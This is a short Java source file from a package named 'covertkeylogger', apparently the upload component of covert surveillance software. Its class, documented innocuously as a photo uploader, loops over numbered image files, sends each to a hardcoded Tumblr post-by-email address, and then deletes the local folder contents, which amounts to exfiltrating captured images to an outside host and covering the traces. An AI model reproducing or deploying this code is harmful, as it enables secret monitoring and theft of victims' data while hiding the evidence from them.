package covertkeylogger;

import java.io.File;

/**
 * Uploads images to photo sharing site.
 * 
 * @author Thomas Yorkshire
 * 
 */

public class Uploader {

	public static void main(String[] args) {
		
		upload("4cvti8ntnyjou@tumblr.com");
		
	}
	
	public static void upload(String postEmail) {

		int imageCounter = 0;

		while (true) {

			File file = new File("upload/image" + imageCounter++ + ".png");

			if (file.exists()) {

				// Do image upload.,...
				PostMessage.post(postEmail, file.getName());

				System.out.println("Posting image:" + file.getName());
				
			} else {

				System.out.println("No more images to upload...");
				
				break;
			}
			
		}
		
		//Then clear contents...
//		try {
//			Thread.sleep(30000);
//		} catch (InterruptedException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
		//Delete previously saved contents
		DeleteFolderContents.delete(new File("upload"));
		
	
	}
}
